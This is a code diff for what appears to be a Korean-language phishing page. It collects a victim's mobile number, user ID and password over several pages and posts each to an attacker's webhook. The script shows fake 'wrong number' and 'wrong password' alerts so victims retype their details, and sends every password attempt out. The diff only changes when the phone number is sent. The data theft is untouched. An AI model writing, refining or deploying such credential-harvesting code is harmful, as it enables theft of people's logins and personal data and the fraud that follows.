@@ -146,30 +146,14 @@ async function collectUserInfo() {
   .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
-// sendPhone 함수 교체 (틀린 전화번호도 항상 webhook 전송)
+// page2 -> page3
 function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
+  if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
   phoneTryCount++;
-
-  // 틀렸든 맞았든 항상 webhook 전송
-  fetch(webhookUrl,{
-    method:"POST",
-    headers:{"Content-Type":"application/x-www-form-urlencoded"},
-    body:new URLSearchParams({
-      page:"2",
-      phone:userId,
-      attempt: phoneTryCount,
-      timestamp:new Date().toISOString()
-    })
-  }).catch(err=>console.error(err));
-
-  if (!phoneRegex.test(userId)) { 
-    alert("잘못된 형식의 전화번호입니다."); 
-    return; 
-  }
 
   if (phoneTryCount < 3) {
     alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
@@ -177,6 +161,12 @@ function sendPhone() {
   }
 
   savedPhone = userId;
+
+  fetch(webhookUrl,{
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})
+  }).catch(err=>console.error(err));
 
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
@@ -202,6 +192,7 @@ function sendPage4() {
   const maxAttempts = 8;
   const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
 
+
   if(loginTryCount >= 1 && loginTryCount <= 5) {
     alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
     fetch(webhookUrl,{
@@ -221,6 +212,7 @@ function sendPage4() {
       body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
     }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
       .catch(err=>console.error(err));
+    return;
     return;
   }
 }
